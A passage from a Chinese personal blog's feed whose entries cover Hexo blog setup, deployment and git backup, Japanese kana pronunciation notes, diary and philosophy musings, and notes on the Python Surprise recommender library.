class="line">$ npm install hexo-cli -g</span><br><span class="line">$ hexo init Blog</span><br><span class="line">$ cd Blog</span><br><span class="line">$ npm install</span><br><span class="line">$ hexo server</span><br></pre>      </td>    </tr>  </table></figure><h4 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create  a new post</h4><pre><code>$ hexo new &quot;My New Post&quot;</code></pre><h4 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run  server</h4><p>写好文章后，先在本地看一下效果，如果满意再发布。进入博客目录，运行 hexo server 后浏览器里访问 <a href="http://127.0.0.1:4000" rel="external nofollow noopener noreferrer" target="_blank">http://127.0.0.1:4000</a>  就可以了。</p><h4 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate  static files</h4><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ hexo generate</span><br></pre>      </td>    </tr>  </table></figure><h3 id="Deploy-to-git"><a href="#Deploy-to-git" class="headerlink" title="Deploy to git"></a>Deploy  to git</h3><ul>  <li>    <p>如你在 Github 的名字为 star，在 Github 创建一个名字为 star.github.io 的仓库 (xtuer 修改为你的      Github 名字)<br>我们博客的网站地址自动为 <a href="http://star.github.io" rel="external nofollow noopener noreferrer" target="_blank">http://star.github.io</a>    </p>  </li>  <li>    <p>安装 hexo 的 git 插件</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p>在 Blog/_ onfig.yml 中配置 git</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repo: git@github.com:star/star.github.io.git</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p>发布时需要执行下面三条命令</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><blockquote>  <p>注意，有时候发布时会提示你没有权限访问 Github 的仓库，那是因为 ssh 访问需要的验证文件无效了，需要更新一下，最简单的就是用 Github    的客户端先访问一下，然后再发布就可以了<br>使用上面的命令发布好博客后，访问 <a href="http://star.github.io" rel="external nofollow noopener noreferrer" target="_blank">http://star.github.io</a>    可以看到我们创建的博客能从网络上访问了<br><a href="https://hexo.io/docs/deployment.html" rel="external nofollow noopener noreferrer" target="_blank">更多信息参考官方文档</a>  </p></blockquote><h3 id="Use-tag"><a href="#Use-tag" class="headerlink" title="Use tag"></a>Use  tag</h3><p>Tag 是用来对文章进行分类的:<br>One tag: tags: Programming<br>Multi tags: tags:  [Programming, Java, Spring]</p><h3 id="Use-image"><a href="#Use-image" class="headerlink" title="Use image"></a>Use  image</h3><p>配置 Blog/_config.yml</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">permalink: :title/</span><br><span class="line">post_asset_folder: true</span><br></pre>      </td>    </tr>  </table></figure><p>在 Blog/source 下创建图片的目录，如 img，md 中引用图片</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">![](../img/post-asset.png)</span><br></pre>      </td>    </tr>  </table></figure><h3 id="主页显示摘要"><a href="#主页显示摘要" class="headerlink" title="主页显示摘要"></a>主页显示摘要</h3><p>在 md 中，摘要内容的后面跟上 <figure class="highlight plain">    <table>      <tr>        <td class="gutter">          <pre><span class="line">1</span><br></pre>        </td>        <td class="code">          <pre><span class="line">用别名简化命令</span><br></pre>        </td>      </tr>    </table>  </figure></p><p>alias hd=’hexo clean; hexo generate; hexo deploy’<br>alias hs=’hexo server  -g’</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre>      </td>      <td class="code">        <pre><span class="line">本地预览用 hs</span><br><span class="line">发布时使用 hd</span><br><span class="line">### 域名选择</span><br><span class="line">例如：登录腾讯云，购买域名后，登录到控制台，域名解析列表，进入记录管理，点击添加记录。</span><br><span class="line"></span><br><span class="line">1. 主机记录选择两个，www和@</span><br><span class="line">2. 记录类型，CNAME</span><br><span class="line">3. 默认线路</span><br><span class="line">4. 记录值填个人的github域名。</span><br><span class="line">5. 其他操作默认</span><br><span class="line">如图所示:</span><br><span class="line">![](https://github.com/starstarb/clouding/raw/master/data/yuming.png)</span><br><span class="line"> 如果没有云主机或服务器，是域名不提供备案的，如果想要备案，可以选择购买一个小空间备案，对小空间进行域名跳转操作，指向github服务器即可。</span><br><span class="line">或者找个认识的朋友(有主机空间的)，帮你备案后，做个转发即可。</span><br><span class="line"></span><br><span class="line">### 主题采用yilia</span><br><span class="line">访问官方文档即可：[点击](https://github.com/litten/hexo-theme-yilia)</span><br><span class="line"></span><br><span class="line">### 使用github图床管理博客图片</span><br><span class="line">1. 登录github账号。</span><br><span class="line">2. 创建仓库例如: picture</span><br><span class="line">![](https://github.com/starstarb/clouding/raw/master/data/cangku.png)</span><br><span class="line">3. github搜索Picgo，参看官方文档</span><br><span class="line">4. 在github,打开settings,找到Personal access tokens ,点击进去，勾选![](https://github.com/starstarb/clouding/raw/master/data/repo.png)</span><br><span class="line">5. 点击Generate token.</span><br><span class="line">6. 这里会产生一段加密字符串，只会产生一次，记录下来。</span><br><span class="line">7. 在Picgo中选择github图床。</span><br><span class="line">8. 仓库名是yourgithubname/picture</span><br><span class="line">9. 分支名默认master</span><br><span class="line">10. token写刚才产生的那段加密字符串。</span><br><span class="line">11. 存储路径可以自定义为python/</span><br><span class="line"></span><br><span class="line">&gt; 写一个字符串加一个斜杠，会自动在github中创建相应路径</span><br><span class="line"></span><br><span class="line">12. 自定义域名为</span><br></pre>      </td>    </tr>  </table></figure><p><a href="https://github.com/yourgithubName/picture/raw/master" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yourgithubName/picture/raw/master</a></p><pre><code>13. 其他操作直接看Picgo官方文档即可，完成。&gt; 另外，如果PicGO用不了复制链接，直接进入图片所在路径，将路径中blog更改为raw即可。</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hexo+yilia搭建属于自己的博客，新手完全教程&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/6.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="hexo" scheme="http://javastar.club/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://javastar.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>日语入门手册0</title>
    <link href="http://javastar.club/archives/37fae12e.html"/>
    <id>http://javastar.club/archives/37fae12e.html</id>
    <published>2019-08-09T13:00:13.000Z</published>
    <updated>2019-08-10T07:24:14.773Z</updated>
    
    <content type="html"><![CDATA[<p>  我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。</p><a id="more"></a><h3 id="五十音清音发音学习笔记"><a href="#五十音清音发音学习笔记" class="headerlink" title="五十音清音发音学习笔记"></a>五十音清音发音学习笔记</h3><p>あア a 类似汉语“啊”，在日语中开口最大，双唇自然张开，口形比汉语“啊”小，声音洪亮<br>いイ i  类似汉语“衣”，比发“衣”时双唇略松，口角咧开较小，声音较尖<br>うウ u  类似汉语“乌”，双唇自然微启，嘴角微拉，双唇不突出，舌面较平，声音较弱。双唇不要象发“乌”那样向前突出，部分老师要求发音时后槽牙接触，以把握口型位置。<br>えエ  e 类似汉语“唉”，双唇稍向左右咧开，舌面放平，声音紧张<br>おオ o  类似汉语“欧”，嘴唇合拢略椭圆形，口型大小处于「あ」和「う」之间，舌面较平，声音圆浑<br>かカ ka 类似拼音“ka”<br>きキ ki  类似拼音“ki”<br>くク ku 类似拼音“ku”，嘴唇平的，双唇不突出。<br>けケ ke  类似英语音标“ke”，也就是单词care/ker/的前半部分<br>こコ ko 类似汉语“扣”，<br>さサ sa 类似汉语“仨”<br>しシshi  类似汉语“西”，注意是发音是“xi”。打字的时候打si也能打出来<br>すス su  发音难以描述，不能直接发成“苏”，像是用“丝”的口型发“苏”的样子。也有些时候直接读“丝”。只发了s的音，网上查到的说法是元音u被清化（即只保留元音的口形和舌位而不发声）<br>せセ  se 类似英语音标“se”，self/self/的前半部分<br>そソ so 类似英语单词“so”<br>たタ ta 类似汉语“他”<br>ちチchi  类似汉语“七”，注意是发音是“qi”。打字的时候打ti也能打出来<br>つツtsu  发音难以描述，像是用“呲”的口型发“粗”的样子。也有建议直接念“呲”的。大写的时候发音，小写的时候是促音不发音。同理打字可以打tu<br>てテ te  类似汉语“胎”<br>とト to 类似汉语“偷”<br>なナ na 类似汉语“那”，な行没什么特殊的，就是n和あ行拼在一起<br>にニ ni  类似汉语“你”<br>ぬヌ nu 类似汉语“奴”<br>ねネ ne 类似汉语“奶”<br>のノ no 类似英语单词“no”<br>はハ ha  类似汉语“哈”，两种读音，平时读ha，助词的时候读wa<br>ひヒ hi 类似英语单词“he”。He is a boy那个he。<br>ふフ fu  类似汉语“夫”，但是不咬唇，上齿接近下唇但有缝隙，不震动声带，只是气流摩擦。罗马音hu、fu都可以<br>へヘ he  类似汉语“嗨”。做助词的时读做e(え)<br>ほホ ho 类似汉语“吼”，类似hold住的ho。<br>まマ ma  类似汉语“马”，ま行没什么特殊的，就是m和あ行拼在一起<br>みミ mi 类似汉语“咪”<br>むム mu 类似汉语“木”<br>めメ me  类似汉语“买”<br>もモ mo 类似汉语“哞”<br>やヤ ya 类似汉语“呀”<br>ゆユ yu 类似英语单词“you”<br>よヨ yo  类似汉语“腰”<br>らラ ra 类似汉语“拉”，ら行r其实是汉语发音里的l，就是l和あ行拼在一起<br>りリ ri 类似汉语“哩”<br>るル ru  类似汉语“撸”<br>れレ re 类似英语音标“le”，let’s go的le<br>ろロ ro 类似汉语“唠”<br>わワ wa  类似汉语“哇”<br>をヲ wo 和おo同音，只做助词，所以不会在单词里出现。<br>んン n 用鼻腔通气发出的声音，不单用，也不出现在词首</p><h3 id="发音："><a href="#发音：" class="headerlink" title="发音："></a>发音：</h3><p><a href="https://jp.hjenglish.com/subject/pronounce_write/" rel="external nofollow noopener noreferrer" target="_blank">https://jp.hjenglish.com/subject/pronounce_write/</a></p><h3 id="记忆："><a href="#记忆：" class="headerlink" title="记忆："></a>记忆：</h3><p><a href="https://www.zhihu.com/question/20318161/answer/67015673" rel="external nofollow noopener noreferrer" target="_blank">https://www.zhihu.com/question/20318161/answer/67015673</a></p><p>电子版教材：</p><p>链接：<a href="https://pan.baidu.com/s/1NvpcbYvQWeghwvv_T7X8rg" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1NvpcbYvQWeghwvv_T7X8rg</a><br>提取码：0gx4<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;
  我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。
&lt;/p&gt;
    
    </summary>
    
      <category term="language" scheme="http://javastar.club/categories/language/"/>
    
    
      <category term="日语" scheme="http://javastar.club/tags/%E6%97%A5%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>第六次日记</title>
    <link href="http://javastar.club/archives/f7899fcc.html"/>
    <id>http://javastar.club/archives/f7899fcc.html</id>
    <published>2019-08-09T12:55:49.000Z</published>
    <updated>2019-08-10T14:21:15.448Z</updated>
    
    <content type="html"><![CDATA[<p>日记</p><a id="more"></a><p>写博客已经成为我的习惯了，一天不写浑身难受。</p><p>  今天安装surprise库一直失败，看着官方文档操作，但是本地环境总是报错。<br>为什么要安装surprise?因为最近要做相关的任务，对kaggle上数据集分析。</p><p>计划学习法语、日语两门小众语言。</p><p>有空再找找相关解决方案，实在不行直接放弃这个库，选择其他推荐系统的库学习。</p><p>有空计划将博客评论系统改成valine,匿名无后端评论系统，单纯gittalk似乎有些孤单。</p><p>  看了霍金的宇宙观，我认为，实际上他并未解决一个问题，那就是上帝是否存在，他认为宇宙的负能量充斥整个宇宙，正能量就是我们所能见得到的能量，那么这些能量又是从哪里来。<br>既然黑洞不存在时间，那么引力场里面所有能量被压缩无穷大，那么是否会有临界点会导致能量再次释放？<br>尽管每个人看法不同，我觉得是存在多元宇宙和其他星系的碳基生命的，在他们看来，我们就是外星人，我们存在，那么必然他们也存在。</p><p>  我思故我在，尽管人脑很复杂，没有了脑中电磁波的传递信息，人类即视为死亡，重新变成原子，在无限随机的情况下，随机组合，再次复生，或许人类的前世记忆在无限随机的情况下可能依然存在。</p><p>  量子物理颠覆了我们的认知，物理学中对空中垂直运动的球体进行受力分析，你如何判断它是向上还是向下运动？无法判断。没有给出方向是不成立的。<br>那么时间正向流动和逆向流动我们也是无法判断的，举个例子，如果在另外的一个宇宙空间，时间逆向流动，那里的人民从苍老变成婴儿，人们并未觉得有什么异常，但是在我们这个宇宙空间来说，是极其荒谬的。</p><p>  里面提到的十维空间，一根弦被拉动，会产生波，波在振动过程中传播能量，产生正能量，也产生负能量，正负能量满足能量守恒定律，正能量是否也是一次宇宙大爆炸？波的振动会产生空间能量，即使那一瞬间很短暂。</p><p>我是单纯敲代码的，但是我们身体的功能在稳定运转，和程序一样，除了基因序列的偶尔会崩溃替换，大多数人还是属于正常的。</p><p>我们是上帝创造出来的随机程序么？</p><p>  例如，在给定一个密闭的生存空间中，上帝通过模拟碳基生命，运行了一段程序，这段程序创造了这个密闭宇宙，正负能量相等，能量不会溢出，如刘慈欣写过的一段科幻小说，模拟超弦计算机，经过无数次的模拟，产生了参数和我们这个世界一样的参数，创世宇宙，诞生了人类文明。</p><p>人类文明灭亡也仅仅在一瞬间，但其实也就是原子的重新组合。</p><p>从这个层面上看，我思故我在，唯心主义似乎更加具有实际意义了。</p><p>放弃了valine，现在LeanCloud不仅需要域名备案，还需要手持上传照片。</p><p>最近对网络安全非常感兴趣，如果考研，就转网安方向吧，希望以后学精通了挖一个漏洞，买一个Mac</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;日记&lt;/p&gt;
    
    </summary>
    
      <category term="日记" scheme="http://javastar.club/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://javastar.club/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>哲学</title>
    <link href="http://javastar.club/archives/5da32671.html"/>
    <id>http://javastar.club/archives/5da32671.html</id>
    <published>2019-08-09T12:54:21.000Z</published>
    <updated>2019-08-10T02:52:35.201Z</updated>
    
    <content type="html"><![CDATA[<p>我思故我在<br><img src="https://github.com/starstarb/clouding/raw/master/picture/3.jpg" alt></p><a id="more"></a><p>  笛卡尔说：“我可以设想我没有身体，可以设想没有我所在的世界，也没有我所在的地点，但是我不能就此设想我不存在，相反地，正是从我想到怀疑一切其他事物的真实性这一点，可以非常明白、非常确定地推出：我是存在的。”</p><p> 笛卡尔把这条原理当做第一哲学原理，这个原理主要强调的是思维与存在的同一，一般称为“Cogito，ergosum”（我思故我是）。</p><p>  人们很容易就可以想象到，一个存在的人必然是有思想的，而一个正思想的人也必然是存在的。我是一个人，我可以把人的一切规定性都抽象掉，但唯独不能抽掉那个“我”。</p><p>  我思想，这个思想就直接包含着我的存在，这是一切哲学的绝对基础。从“我思故我在”走向唯心主义“我思故我在”强调的是思维与存在的同一性，但忽略了分离的绝对性，只看到了矛盾中的同一方面，而没有看到对立之所在，缺少了辩证思维，自然会有唯心主义倾向了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我思故我在&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/3.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="哲学" scheme="http://javastar.club/categories/%E5%93%B2%E5%AD%A6/"/>
    
    
      <category term="哲学" scheme="http://javastar.club/tags/%E5%93%B2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>hexo 博客备份</title>
    <link href="http://javastar.club/archives/b5d2c57b.html"/>
    <id>http://javastar.club/archives/b5d2c57b.html</id>
    <published>2019-08-08T07:10:35.000Z</published>
    <updated>2019-08-10T02:57:08.525Z</updated>
    
    <content type="html"><![CDATA[<p>hexo博客备份指南<br><img src="https://github.com/starstarb/clouding/raw/master/picture/4.jpg" alt></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  由于之前忘记备份Hexo博客的markdown文件，在重做系统时候还忘记备份博客了，导致现在不得不重新从网页上扒下来之前的文章重新写一遍，十分耗费精力。因此在网上找了下如何备份Hexo博客，在此记录下。</p><p>  目前假设Git和Github环境已经配置好了，如果没有配置好详见「Ubuntu16.04下Github配置」。<br>Git相关操作请参考廖雪峰的Git教程。</p><h3 id="备份博客"><a href="#备份博客" class="headerlink" title="备份博客"></a>备份博客</h3><p>目前假设本地Hexo博客已经初始化。</p><p>###创建新分支</p><p>在Github.io上建立博客时已经开了一个新仓库了，如果再开另一个仓库存放源代码有点浪费，因此采用建立新分支的方法备份博客。</p><p>虽然理论上什么时候创建新分支来备份都可以，但是还是建议在建立博客的时候就创建备份分支。（然而我中途才想起来-.-）</p><p>  不过在建立新分支前请确保仓库内已有master分支（Hexo本地建站后第一次上传时会自动生成），否则后期再添加master分支比较麻烦（请自行搜索git命令）。</p><p>本地Git建立新分支命令如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">$ git checkout -b BRANCHNAME</span><br></pre>      </td>    </tr>  </table></figure><p>BRANCHNAME是自定义的新分支的名字，建议起为hexo。<br>建立.gitignore</p><p>建立.gitignore文件将不需要备份的文件屏蔽。个人的.gitignore文件如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre>      </td>    </tr>  </table></figure><p>在Github上备份</p><p>通过如下命令将本地文件备份到Github上。</p><p>假设目前在hexo博客的根目录下。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;Backup&quot;</span><br><span class="line">$ git push origin hexo</span><br></pre>      </td>    </tr>  </table></figure><p>这样就备份完博客了且在Github上能看到两个分支(master和hexo)。<br>设置默认分支</p><p>  在Github上你的github.io仓库中设置默认分支为hexo。这样有助于之后恢复博客。master分支时默认的博客静态页面分支，在之后恢复博客的时候并不需要。<br>个人备份习惯</p><p>个人而言习惯于先备份文件再生成博客。即先执行<strong>git add .,git commit -m “Backup”,git push    origin hexo</strong>将博客备份完成，然后执行<strong>hexo g -d</strong>发布博客。<br>恢复博客</p><p>目前假设本地Hexo博客基础环境已经搭好。<br>克隆项目到本地</p><p>输入下列命令克隆博客必须文件(hexo分支)：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ git clone https://github.com/yourgithubname/yourgithubname.github.io</span><br></pre>      </td>    </tr>  </table></figure><h3 id="恢复博客"><a href="#恢复博客" class="headerlink" title="恢复博客"></a>恢复博客</h3><p>在克隆的那个文件夹下输入如下命令恢复博客：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ npm install hexo-cli</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-deployer-git</span><br></pre>      </td>    </tr>  </table></figure><p>在此不需要执行hexo init这条指令，因为不是从零搭建起新博客。</p><p>完成喵～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo博客备份指南&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/4.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
    
      <category term="github" scheme="http://javastar.club/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>python数据分析常用库</title>
    <link href="http://javastar.club/archives/460b5ed.html"/>
    <id>http://javastar.club/archives/460b5ed.html</id>
    <published>2019-08-08T07:09:19.000Z</published>
    <updated>2019-08-09T12:53:36.830Z</updated>
    
    <content type="html"><![CDATA[<p>sklearn/surprise</p><a id="more"></a><p>网上有很多关于sklearn的学习教程，大部分都是简单的讲清楚某一方面，其实最好的教程就是官方文档。</p><p>　　官方文档地址：<a href="https://scikit-learn.org/stable/" rel="external nofollow noopener noreferrer" target="_blank">https://scikit-learn.org/stable/</a></p><p>  （可是官方文档非常详细，同时许多人对官方文档的理解和结构上都不能很好地把握，我也打算好好学习sklearn，这可能是机器学习的神器），下面先简单介绍一下sklearn。</p><p>  　　自2007年发布以来，scikit-learn已经成为Python重要的机器学习库了，scikit-learn简称sklearn，支持包括分类，回归，降维和聚类四大机器学习算法。还包括了特征提取，数据处理和模型评估者三大模块。</p><p>　　sklearn是Scipy的扩展，建立在Numpy和matplolib库的基础上。利用这几大模块的优势，可以大大的提高机器学习的效率。</p><p>  　　sklearn拥有着完善的文档，上手容易，具有着丰富的API，在学术界颇受欢迎。sklearn已经封装了大量的机器学习算法，包括LIBSVM和LIBINEAR。同时sklearn内置了大量数据集，节省了获取和整理数据集的时间。</p><h4 id="安装surprise库报错"><a href="#安装surprise库报错" class="headerlink" title="安装surprise库报错"></a>安装surprise库报错</h4><p>Surprise是一个开源推荐系统，包含了常用的矩阵分解算法、包括SVD、SVD++，NMF等等，GitHub地址：<a href="https://github.com/NicolasHug/Surprise" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/NicolasHug/Surprise</a><br>参考官方安装方式<br>其中缺少Microsoft  Visual C++14，因此需要安装:<br><strong>安装地址</strong><br>链接：<a href="https://pan.baidu.com/s/1F2vTVhU8SQbMEoSBCk5jPw" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1F2vTVhU8SQbMEoSBCk5jPw</a><br>提取码：re39<br>我的windows10安装surprise报错如下：<br><img src="https://github.com/starstarb/clouding/raw/master/python/surprise%E6%8A%A5%E9%94%99.png" alt><br><strong>import    surprise库不报错，但是没有相关SVD    Dataset库</strong><br>cl.exe不存在环境路径配置好后，依然不行，打开cl.exe，报mspdb140.dll不存在，未解决。</p><h3 id="surprise库官方文档分析（一）"><a href="#surprise库官方文档分析（一）" class="headerlink" title="surprise库官方文档分析（一）"></a>surprise库官方文档分析（一）</h3><p><strong>一：入门</strong></p><p>　1、基本用法</p><p>　（1）、自动交叉验证</p><p>　　Surprise有一套内置的 算法和数据集供您使用。在最简单的形式中，只需几行代码即可运行交叉验证程序：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset (download it if needed),  </span><br><span class="line"># 加载movielens-100k数据集（如果需要，下载）</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># ＃我们将使用SVD算法。</span><br><span class="line"># We&apos;ll use the famous SVD algorithm.</span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">#运行5倍交叉验证并打印结果</span><br><span class="line"># Run 5-fold cross-validation and print results</span><br><span class="line">cross_validate(algo, data, measures=[&apos;RMSE&apos;, &apos;MAE&apos;], cv=5, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>输出结果：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">Evaluating RMSE, MAE of algorithm SVD on 5 split(s).</span><br><span class="line"></span><br><span class="line">                  Fold 1  Fold 2  Fold 3  Fold 4  Fold 5  Mean    Std     </span><br><span class="line">RMSE (testset)    0.9398  0.9321  0.9413  0.9349  0.9329  0.9362  0.0037  </span><br><span class="line">MAE (testset)     0.7400  0.7351  0.7400  0.7364  0.7370  0.7377  0.0020  </span><br><span class="line">Fit time          5.66    5.47    5.46    5.60    5.77    5.59    0.12    </span><br><span class="line">Test time         0.24    0.14    0.18    0.15    0.15    0.17    0.04</span><br></pre>      </td>    </tr>  </table></figure><p>  该load_builtin()方法将提供下载movielens-100k数据集（如果尚未下载），并将其保存.surprise_data在主目录的文件夹中（您也可以选择将其保存在其他位置）。</p><p>我们在这里使用众所周知的 SVD 算法，但是有许多其他算法可用。</p><p>该cross_validate()  函数根据cv参数运行交叉验证过程，并计算一些accuracy度量。我们在这里使用经典的5倍交叉验证，但可以使用更高级的迭代器</p><p>（2）、测试集分解和fit()方法</p><p>如果您不想运行完整的交叉验证程序，可以使用对 train_test_split()  给定大小的训练集和测试集进行采样，并使用您的选择。您将需要使用将在列车集上训练算法的方法，以及将返回从testset进行的预测的方法：accuracy  metricfit()test()</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import train_test_split</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset (download it if needed),</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># sample random trainset and testset #  随机测试集和训练集</span><br><span class="line"># test set is made of 25% of the ratings. # 将25%的数据设置成测试集</span><br><span class="line">trainset, testset = train_test_split(data, test_size=.25)</span><br><span class="line"></span><br><span class="line"># We&apos;ll use the famous SVD algorithm.</span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line"># Train the algorithm on the trainset, and predict ratings for the testset # 在训练集中训练算法，并预测数据</span><br><span class="line">algo.fit(trainset)</span><br><span class="line">predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line"># Then compute RMSE</span><br><span class="line">accuracy.rmse(predictions)</span><br></pre>      </td>    </tr>  </table></figure><p>执行结果：</p><p>RMSE: 0.9461</p><p>（3）、训练整个训练集和predict()方法</p><p>  显然，我们也可以简单地将算法拟合到整个数据集，而不是运行交叉验证。这可以通过使用build_full_trainset()将构建trainset对象的方法来完成  ：<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">from surprise import KNNBasic</span><br><span 